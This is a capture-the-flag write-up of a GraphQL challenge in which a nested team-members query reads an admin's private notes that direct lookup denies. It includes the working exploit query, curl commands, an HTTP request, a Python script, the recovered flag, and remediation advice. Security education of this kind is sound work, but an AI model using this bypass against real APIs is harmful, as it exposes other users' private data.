
# WEB — The Shape of Query

**Category:** Web Exploitation / GraphQL  
**Challenge:** The Shape of Query  
**Target:** https://shape-of-query.pointeroverflowctf.com  
**Result:** Solved

**Technique:** GraphQL Broken Object Level Authorization (BOLA) through an alternative query path

**Flag:**

~~~text
POCTF{81.485.NHWDWPKMCVH7FWST.5E7UINXH73UHVJEH5SCYNLRMSR}
~~~

---

## 1. Overview

This challenge is a good example of why GraphQL authorization has to be tested from more than one angle.

The target is a collaborative research portal backed by a GraphQL API. As an authenticated **MEMBER**, the intended goal was to access another researcher's private notes within the same team.

At first, the obvious object lookup appeared to be properly protected:

~~~graphql
user(id: "admin_485") {
  privateNotes
}
~~~

returned null.

That looked like the end of the road.

It was not.

GraphQL exposes the same User object through multiple resolver paths. The direct user(id:) query checked authorization, but the nested relationship

~~~text
me → team → members → privateNotes
~~~

did not.

By reaching admin_485 through the team membership relationship, the API returned the private note containing the flag.

The whole solve can be summarized as:

~~~text
Session
   ↓
GraphQL Introspection
   ↓
Identify User + Team relationships
   ↓
Establish authorization baseline
   ↓
Direct user(id:) lookup is denied
   ↓
Test an alternative query shape
   ↓
me → team → members → privateNotes
   ↓
Unauthorized admin note disclosure
   ↓
POCTF{81.485.NHWDWPKMCVH7FWST.5E7UINXH73UHVJEH5SCYNLRMSR}
~~~

The important lesson is simple:

> In GraphQL, a denied object reference on one path does not prove that the object is protected on every path.

---

## 2. Scope and Authorization

Testing was limited to the challenge instance:

~~~text
https://shape-of-query.pointeroverflowctf.com
~~~

The provided session token was bound to team 485.

For the public writeup, the original session token and resulting session cookie are intentionally not included. Use the team token provided by the CTF instance when reproducing the steps.

No intrusive scanning was performed. Enumeration stayed focused on the GraphQL schema and the relationships needed to test object-level authorization.

---

## 3. Reconnaissance

### 3.1 Landing page

A GET / request returned the Collaborative Research Portal login flow.

The page indicated that authentication starts by exchanging the supplied team token:

~~~text
POST /session/exchange
{
  "token": "<TEAM_SESSION_TOKEN>"
}
~~~

A successful exchange creates an authenticated session and redirects the user toward /graphql.

One useful detail was exposed immediately: GraphQL introspection was enabled.

That meant there was no reason to guess field names or blindly brute-force the API. The schema could simply be enumerated.

### 3.2 Unauthenticated GraphQL behavior

Before authenticating, I sent a minimal GraphQL query:

~~~bash
curl -sk https://shape-of-query.pointeroverflowctf.com/graphql \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
~~~

The server responded with:

~~~json
{
  "errors": [
    {
      "extensions": {
        "hint": "POST /session/exchange with your team token first"
      },
      "message": "session_required"
    }
  ]
}
~~~

A direct GET /graphql request without a session returned a redirect back to /.

So anonymous access was not available. Authentication was required before interacting with the API.

### 3.3 Session exchange

Using the CTF-provided token:

~~~bash
curl -sk -c cookies.txt -b cookies.txt \
  https://shape-of-query.pointeroverflowctf.com/session/exchange \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"token":"<TEAM_SESSION_TOKEN>"}'
~~~

The exchange returned:

~~~json
{"ok":true,"team_id":485}
~~~

The server then issued an HttpOnly session cookie.

Once the cookie was stored, the same GraphQL test succeeded:

~~~graphql
{ __typename }
~~~

Response:

~~~json
{
  "data": {
    "__typename": "Query"
  }
}
~~~

The service identified itself as running behind nginx on Ubuntu, but that information was not important to the exploit. The GraphQL authorization logic was.

---

## 4. GraphQL Enumeration

I approached the API in a few deliberate steps rather than immediately trying random IDs.

### Methodology

~~~text
1. Recover the schema through introspection
2. Establish the authenticated identity with me
3. Test direct object access with user(id:)
4. Follow object relationships through User.team
5. Compare authorization behavior across query shapes
6. Exploit the path where the authorization check is missing
~~~

### 4.1 Schema recovery

Introspection revealed the important part of the schema:

~~~graphql
type Query {
  me: User
  user(id: ID!): User
}

type User {
  id: ID!
  username: String!
  role: UserRoleEnum
  team: Team
  privateNotes: String
}

type Team {
  id: ID!
  name: String
  members: [User]
}

enum UserRoleEnum {
  ADMIN
  MEMBER
}
~~~

There was no mutation support, so the challenge was read-only.

The key findings were:

- Query.user(id:) gives direct access to a User object.
- Query.me identifies the current principal.
- User.team exposes the current team.
- Team.members exposes other users in that team.
- User.privateNotes is the sensitive field.
- Introspection removes the need for brute-force schema discovery.

At this point, the interesting question became: **does authorization stay consistent when the same User object is reached through a different path?**

---

## 5. Establishing the Baseline

### 5.1 Identity

I started with me and requested enough information to understand the account and its relationships:

~~~graphql
{
  me {
    id
    username
    role
    team {
      id
      name
      members {
        id
        username
      }
    }
    privateNotes
  }
}
~~~

The response showed:

~~~json
{
  "data": {
    "me": {
      "id": "user_485",
      "username": "researcher_485",
      "role": "MEMBER",
      "team": {
        "id": "team_485",
        "name": "Research Team 485",
        "members": [
          {
            "id": "user_485",
            "username": "researcher_485"
          },
          {
            "id": "admin_485",
            "username": "admin_485"
          }
        ]
      },
      "privateNotes": "Grocery list, personal reminders. Nothing worth reading."
    }
  }
}
~~~

This established three useful facts:

~~~text
Current user  → user_485 / researcher_485 / MEMBER
Current team  → team_485 / Research Team 485
Other member  → admin_485
~~~

My own privateNotes contained only decoy text.

The interesting account was admin_485, which was later confirmed to have the ADMIN role.

---

## 6. Direct Object Authorization Test

The next step was to test the obvious ID-based access path.

### Self

~~~graphql
{
  user(id: "user_485") {
    id
    username
    role
    team {
      id
      name
    }
    privateNotes
  }
}
~~~

This worked as expected because the target was the current user.

### Same-team admin

~~~graphql
{
  user(id: "admin_485") {
    id
    username
    role
    team {
      id
      name
    }
    privateNotes
  }
}
~~~

Result:

~~~json
{
  "data": {
    "user": null
  }
}
~~~

So the direct lookup was denied.

### Other-team admin

I also checked an account from another team:

~~~graphql
{
  user(id: "admin_486") {
    id
    username
    privateNotes
  }
}
~~~

Again:

~~~json
{
  "data": {
    "user": null
  }
}
~~~

This was a useful negative control.

From the direct lookup alone, the API appeared to enforce a self-only or otherwise restrictive authorization rule.

A typical first conclusion would be:

> "The IDOR is fixed because user(id:) returns null for another user."

But GraphQL changes the testing model slightly. The same object type can be reached through several resolver paths.

So I kept looking for another route to the same User.

---

## 7. The Interesting Part — Query Shape

The challenge title was a strong hint to think about the **shape of the query**, not just the object ID.

The schema already showed a relationship:

~~~text
Query.me
   ↓
User.team
   ↓
Team.members
   ↓
User
   ↓
User.privateNotes
~~~

That gave me a second way to reach admin_485.

The hypothesis was:

> If Query.user(id:) performs the authorization check itself, but Team.members returns user objects without applying the same policy, then the nested path may bypass the restriction entirely.

This is a common GraphQL failure mode.

A resolver can be perfectly careful at the top level while nested resolvers assume that the parent object is already trusted. If sensitive fields do not enforce their own authorization, the API can return data that should have been blocked.

---

## 8. Confirming the Authorization Bypass

I tested the alternate query shape:

~~~graphql
{
  me {
    team {
      members {
        id
        username
        role
        privateNotes
        team {
          id
          name
        }
      }
    }
  }
}
~~~

This time, the result was different.

The response included both team members, including the admin:

~~~json
{
  "data": {
    "me": {
      "team": {
        "members": [
          {
            "id": "user_485",
            "username": "researcher_485",
            "role": "MEMBER",
            "privateNotes": "Grocery list, personal reminders. Nothing worth reading.",
            "team": {
              "id": "team_485",
              "name": "Research Team 485"
            }
          },
          {
            "id": "admin_485",
            "username": "admin_485",
            "role": "ADMIN",
            "privateNotes": "POCTF{81.485.NHWDWPKMCVH7FWST.5E7UINXH73UHVJEH5SCYNLRMSR}",
            "team": {
              "id": "team_485",
              "name": "Research Team 485"
            }
          }
        ]
      }
    }
  }
}
~~~

That confirmed the bug.

The exact same object behaved differently depending on how it was reached:

~~~text
user(id: "admin_485").privateNotes
                ↓
             denied

me.team.members → admin_485 → privateNotes
                ↓
             allowed
~~~

No injection was necessary.

No IDOR parameter manipulation was necessary beyond discovering the alternate object path.

No privilege escalation was necessary.

The query was completely valid according to the schema.

---

## 9. Root Cause

The behavior is consistent with authorization being enforced at the top-level Query.user resolver but not when returning user objects through the team relationship.

A simplified vulnerable design would look like this:

~~~python
# Vulnerable pattern

def resolve_user(_, info, id):
    if id != info.context.current_user.id:
        return None
    return get_user(id)


def resolve_team_members(team, info):
    return get_team_members(team.id)


def resolve_privateNotes(user, info):
    return user.private_notes
~~~

The problem is not that resolve_user() forgot to check authorization. It did check.

The problem is that authorization was tied to **one entry point** rather than to the protected object or field.

A safer design would make the policy consistent regardless of the path used to reach the object:

~~~python
# Conceptual fixed pattern

def can_read_private_notes(requester, target):
    return (
        requester.id == target.id
        or (
            requester.role == "ADMIN"
            and requester.team_id == target.team_id
        )
    )


def resolve_privateNotes(user, info):
    requester = info.context.current_user

    if not can_read_private_notes(requester, user):
        return None

    return user.private_notes
~~~

The exact policy will depend on the application's requirements, but the important architectural point remains:

> Authorization for a sensitive field should not depend on whether the object came from Query.user, Team.members, a fragment, or any other GraphQL path.

---

## 10. Minimal Exploit

Once the vulnerable path was identified, the exploit became very small.

A single authenticated request was enough:

~~~http
POST /graphql HTTP/1.1
Host: shape-of-query.pointeroverflowctf.com
Content-Type: application/json
Cookie: session=<AUTHENTICATED_SESSION_COOKIE>

{"query":"{ me { team { members { id username role privateNotes } } } }"}
~~~

That query returned the admin's private notes and therefore the flag.

There was no need for:

~~~text
- Aliases
- Fragments
- Batching
- Injection
- Token forgery
- Credential cracking
- Privilege escalation
~~~

The vulnerability was purely an authorization inconsistency.

---

## 11. Reproduction with Python

The same path can be reproduced with requests using the authenticated session from the challenge:

~~~python
import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://shape-of-query.pointeroverflowctf.com"

session = requests.Session()
session.cookies.set(
    "session",
    "<AUTHENTICATED_SESSION_COOKIE>",
    domain="shape-of-query.pointeroverflowctf.com",
    path="/",
)

query = """
{
  me {
    team {
      members {
        id
        username
        role
        privateNotes
        team {
          id
          name
        }
      }
    }
  }
}
"""

response = session.post(
    f"{BASE}/graphql",
    json={"query": query},
    verify=False,
)

print(response.text)
~~~

In a real reproduction, the placeholder should be replaced with the session cookie issued by /session/exchange.

For a public writeup, keeping the live credential out of Git is the safer choice.

---

## 12. Verification

I verified the result from several angles instead of relying on a single successful response.

### Identity

The authenticated principal was:

~~~text
user_485
researcher_485
MEMBER
~~~

### Target

The disclosed account was:

~~~text
admin_485
ADMIN
team_485
~~~

### Same-team relationship

The flag appeared in the notes of a member returned by:

~~~text
me → team_485 → members
~~~

So the data stayed within the intended team boundary.

### Cross-team negative check

A direct request for:

~~~graphql
user(id: "admin_486")
~~~

returned null.

The nested me.team.members path also returned only members of team_485.

There was therefore no evidence that this primitive provided arbitrary cross-team traversal. The impact demonstrated here was intra-team lateral access to another user's private data.

### Flag integrity

The exact flag recovered was:

~~~text
POCTF{81.485.NHWDWPKMCVH7FWST.5E7UINXH73UHVJEH5SCYNLRMSR}
~~~

Its embedded values also matched the session context:

~~~text
81
485
NHWDWPKMCVH7FWST
~~~

This was consistent with the challenge's team/session binding.

### Read impact

The schema exposed no mutations, so there was no write primitive to investigate.

The demonstrated impact was therefore complete for the challenge objective: unauthorized disclosure of another user's privateNotes.

---

## 13. Authorization Matrix

| Query shape | Target | Result |
|---|---|---|
| me { privateNotes } | Self | Allowed — decoy text |
| user(id: "user_485") { privateNotes } | Self | Allowed |
| user(id: "admin_485") { privateNotes } | Same-team admin | Denied (null) |
| user(id: "admin_486") { privateNotes } | Other-team admin | Denied (null) |
| me { team { members { privateNotes } } } | Same-team admin | Allowed — flag disclosed |

The matrix makes the root cause obvious: the authorization decision changed with the query path.

---

## 14. Impact

From a CTF perspective, the bug fully compromised the challenge objective.

In a real collaborative research application, the same flaw could expose:

~~~text
- Private research notes
- Internal project information
- Personal data
- Credentials accidentally stored in notes
- Session tokens or API keys accidentally stored in notes
- Intellectual property
~~~

The important security property that failed is **object-level isolation between users in the same organization/team**.

The issue maps directly to **OWASP API1:2023 — Broken Object Level Authorization (BOLA)**. It can also be understood as an IDOR-style authorization failure caused by an alternate GraphQL object path.

---

## 15. Remediation

The safest fix is not to patch only Query.user(id:). The authorization policy should be applied consistently wherever a protected object or field can be reached.

### 15.1 Enforce authorization at the sensitive field/object layer

For example, privateNotes should explicitly verify whether the requester can read the target user's notes.

A possible policy could be:

~~~text
requester == target
OR
requester is an authorized administrator for the same team
~~~

The exact rule depends on the application's business requirements.

### 15.2 Do not trust nested resolvers

Every resolver that returns a User object should follow the same authorization model.

A resolver should not assume:

> "The parent object is allowed, therefore everything under it is allowed."

That assumption is exactly what created the bypass here.

### 15.3 Add authorization tests for query paths

Testing only this:

~~~graphql
user(id: "...") { privateNotes }
~~~

is not enough.

Tests should cover every meaningful path that can reach the sensitive field, including:

~~~text
Query.me
Query.user
User.team
Team.members
Fragments
Aliases
Nested combinations
~~~

The exact set depends on the schema, but the principle is general: **test authorization by object and field, not just by entry point.**

### 15.4 Consider removing sensitive fields from relationship-heavy types

If private notes are meant to be strictly private, returning them through Team.members is unnecessary and risky.

A cleaner schema could expose the field only through a dedicated, authorization-controlled path such as:

~~~graphql
me {
  privateNotes
}
~~~

and avoid making privateNotes available on broad team-member listings.

### 15.5 Treat introspection as a secondary concern

Disabling introspection in production may reduce information exposure, but it would not fix this vulnerability.

The authorization bug still exists if an attacker knows or discovers the schema through documentation, client code, UI behavior, or other means.

### 15.6 Audit sensitive access

Access to fields such as privateNotes should be logged with enough context to investigate abuse, for example:

~~~text
requester_id
target_user_id
team_id
query path
timestamp
~~~

---

## 16. Methodology Lessons

This challenge reinforced a useful GraphQL testing principle:

~~~text
Object authorization ≠ entry-point authorization
~~~

When testing GraphQL APIs, I would keep the following workflow in mind:

~~~text
1. Recover the schema.
2. Identify sensitive object types and fields.
3. Find every relationship that can return the sensitive object.
4. Test direct references.
5. Test nested references.
6. Compare the authorization result for the same object across paths.
~~~

The important observation here was not simply that admin_485 was accessible.

It was that **the same user object was treated differently by different resolvers**.

That is the signal worth looking for.

---

## 17. Final Takeaway

The solve was not about finding a complicated payload. It was about noticing a mismatch between two otherwise legitimate GraphQL paths.

The direct object lookup was protected:

~~~text
user(id:) → authorization check → denied
~~~

The relationship path was not:

~~~text
me → team → members → privateNotes → allowed
~~~

Once that difference was identified, the rest of the challenge was straightforward.

The main lesson is one I would carry into real GraphQL testing:

> **Do not stop at "the IDOR returned null." Trace every path that can reach the same object.**

For GraphQL, the shape of the query can be part of the attack surface.

---

## Final Flag

~~~text
POCTF{81.485.NHWDWPKMCVH7FWST.5E7UINXH73UHVJEH5SCYNLRMSR}
~~~
